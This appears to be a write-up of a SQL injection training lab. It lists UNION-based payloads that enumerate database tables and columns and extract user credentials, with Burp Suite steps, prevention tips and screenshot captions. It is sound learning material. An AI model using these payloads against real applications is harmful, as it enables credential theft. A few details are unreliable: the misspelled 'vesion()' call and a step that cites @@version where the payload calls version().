# 🔐 Lab 5: Listing Database contents on Non-Oracle.

## 🧩 Objective
To retrieve username and password by listing tables and columns contents in the database and login as administrator.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection in the product category parameter, allowing attackers to
execute arbitrary SQL queries and access database metadata.

## ⚙️ Payload Used
- ' ORDER BY 3--  
- ' UNION SELECT 'a', 'a'--  
- ' UNION SELECT vesion(), NULL--
- ' UNION SELECT table_name, NULL FROM information_schema.tables--
- ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE
table_name = 'users_tauqk'--
- 'UNION SELECT username_afugxj, password_vujgi FROM users_tauqk

## 🔎 Analysis
1. Determine the number of columns using first payload. 3 - 1 = 2  
2. Determine the data types of the columns using second payload  
3. Both MySQL and Microsoft have same SELECT @@version command 
4. retrieve list of the table name in the database ->' UNION SELECT table_name, NULL FROM information_schema.tables--
5. retrieve the column name of the table -> ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE
table_name = 'users_tauqk'--
6. Output the username and password -> 'UNION SELECT username_afugxj, password_vujgi FROM users_tauqk

## 🚀 Steps to Reproduce
1. Navigate to the product category page  
2. Intercept the request using Burp Suite  
3. Send the request to Repeater and modify the parameter using commands.  
4. Send the request and analyze the resonse  

## ✅ Result
Successfully retrieved database table names, column names, and sensitive user credentials from the database.

## 🧠 Key Learning
SQL Injection can be used to enumurate database structure and extract sensitive data such as username and password.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Implement proper input validation
- Appluy least privilege to database accounts 
- Avoid exposing database errors and sensitive data  

---

## 📸 Screenshots

<img width="1355" height="664" alt="LAB5_1" src="https://github.com/user-attachments/assets/6176841a-cada-4a5f-a341-e0adca6b3793" />

**Figure 1:Determining number of columns using ORDER BY payload**

<br><br>
<img width="1349" height="655" alt="LAB5_3" src="https://github.com/user-attachments/assets/737068bd-9d53-4740-9543-6b6e394c67de" />

**Figure 2: Finding the database by using UNION payload**

<br><br>
<img width="1358" height="678" alt="LAB5_5" src="https://github.com/user-attachments/assets/45e83f20-0ad9-41c2-83d9-c8d70c246224" />

**Figure 3: Listing database tables using information_schema.tables**

<br><br>
<img width="1341" height="647" alt="LAB5_6" src="https://github.com/user-attachments/assets/67868f0e-7da8-46f0-ac8e-9434cc0260e7" />

**Figure 4:Extracting column names from users table**

<br><br>

<img width="1336" height="679" alt="LAB5_7" src="https://github.com/user-attachments/assets/7312497f-9b99-4f55-8e71-f7ebde9b56e1" />

**Figure 5: Retrieving usernames and passwords from users table**

<br><br>

<img width="1344" height="624" alt="LAB5_8" src="https://github.com/user-attachments/assets/6fbf91b9-64a5-4bcb-9f42-428f9329b102" />
<img width="1334" height="679" alt="LAB5_9" src="https://github.com/user-attachments/assets/e48bdae1-83de-48b2-a4b7-b3956645a62b" />

**Figure 6: Successful extraction of sensitive data (Lab Solved)**
